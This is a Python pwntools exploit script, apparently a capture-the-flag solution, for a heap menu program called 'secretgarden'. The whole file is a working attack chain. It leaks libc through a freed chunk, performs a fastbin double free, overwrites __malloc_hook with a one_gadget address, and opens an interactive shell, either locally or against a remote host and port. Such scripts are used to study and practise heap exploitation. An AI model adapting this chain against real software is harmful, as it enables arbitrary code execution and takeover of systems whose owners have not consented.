#encoding:utf-8
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./secretgarden")#, aslr=0

elf = ELF("./secretgarden")
#libc = ELF("./libc-2.23.so")
libc = elf.libc
#-------------------------------------
def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
    p.interactive()
#-------------------------------------
def create(size,name,color):
    ru("Your choice : ")
    sl("1")
    ru("Length of the name :")
    sl(str(size))
    ru("The name of flower :")
    sd(name)
    ru("The color of the flower :")
    sl(color)

def visit():
    ru("Your choice : ")
    sl("2")

def remote(index):
    ru("Your choice : ")
    sl("3")
    ru("Which flower do you want to remove from the garden:")
    sl(str(index))

def clean():
    ru("Your choice : ")
    sl("4")

create(0x98,"a"*8,"1234")
create(0x68,"b"*8,"b"*8)
create(0x68,"b"*8,"b"*8)
create(0x20,"b"*8,"b"*8)
remote(0)
clean()
create(0x98,"c"*8,"c"*8)
visit()

ru("c"*8)
leak = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak -0x58-0x10 -libc.symbols["__malloc_hook"]
print "leak----->"+hex(leak)
malloc_hook = libc_base +libc.symbols["__malloc_hook"]
print "malloc_hook----->"+hex(malloc_hook)
print "libc_base----->"+hex(libc_base)
one_gadget = 0xf02a4 + libc_base


remote(1)
remote(2)
remote(1)
#debug()
create(0x68,p64(malloc_hook-0x23),"b"*4)
create(0x68,"b"*8,"b"*8)
create(0x68,"b"*8,"b"*8)

create(0x68,"a"*0x13+p64(one_gadget),"b"*4)

remote(1)
remote(1)

getshell()

